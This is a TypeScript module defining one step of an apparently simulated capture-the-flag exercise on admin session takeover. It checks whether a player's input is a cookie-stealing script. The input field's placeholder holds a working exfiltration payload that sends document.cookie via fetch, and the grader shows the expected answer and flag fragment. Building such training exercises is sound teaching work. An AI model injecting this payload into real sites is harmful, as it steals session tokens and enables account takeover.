import type { CtfStep } from "../types";

export const adminTakeoverTokenStep: CtfStep = {
    id: "admin-takeover-token",
    title: "Step 3 — Token Extraction",
    objective:
        "Use the injected script to extract the simulated admin session token.",
    field: {
        name: "exfil",
        label: "Exfiltration target",
        placeholder: "fetch('/collect?token='+document.cookie)",
        type: "text",
    },
    evaluate(input) {
        const exfil = String(input.exfil ?? "").toLowerCase();

        if (
            exfil.includes("document.cookie") &&
            (exfil.includes("fetch") || exfil.includes("collect"))
        ) {
            return {
                success: true,
                message: "Admin token extracted.",
                flagFragment: "_token",
                logs: [
                    { level: "info", message: "admin review triggered payload" },
                    { level: "warning", message: "document.cookie accessed" },
                    { level: "success", message: "admin_session=adm_debug_713 extracted" },
                    { level: "success", message: "flag fragment recovered: _token" },
                ],
            };
        }

        return {
            success: false,
            message: "No useful token extracted.",
            logs: [
                { level: "info", message: "payload executed" },
                { level: "error", message: "admin token not accessed" },
            ],
        };
    },
};